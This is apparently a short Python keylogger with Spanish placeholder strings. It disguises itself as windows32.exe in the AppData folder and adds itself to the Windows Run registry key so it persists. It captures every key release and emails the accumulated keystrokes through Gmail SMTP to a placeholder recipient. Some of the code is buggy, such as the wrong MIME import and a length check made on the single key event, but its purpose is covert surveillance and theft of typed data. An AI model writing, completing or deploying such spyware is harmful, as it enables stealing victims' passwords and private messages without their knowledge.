import keyboard as board
import MIMEMultipart
import smtplib
import os
import subprocess
import shutil
import sys
import datetime

location = os.environ['appdata'] + '\\windows32.exe'
if not  os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d "'+ location +'"',shell=True)

Text = ""

while True:
    Recorded = str(board.read_event())

    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(', '')
        Recorded = Recorded.replace(' up' , '')

        if (len(Recorded)>1):
            Text = Text + "" + Recorded + ""
        else:
            Text = Text + Recorded

    if (len(Recorded)>500):
         try:
             msg= MIMEMultipart()
             password="contrasenia/password"
             msg['From']='email que envia los datos'
             msg['To'] = 'email que recibe datos'
             msg['Subject']="Reporte de los datos" + str(datetime.datetime.now().date)
             msg.attach(MIMEMultipart.Text(Text, 'plain'))
             server = smtplib.SMTP('smtp.gmail.com: 587')
             server.starttls()
             server.login(msg['From'], password)
             server.sendmail(msg['From'], msg['To'], msg.as_string())
             server.quit()
             Text=""
             
         except:
             print("Error al enviar")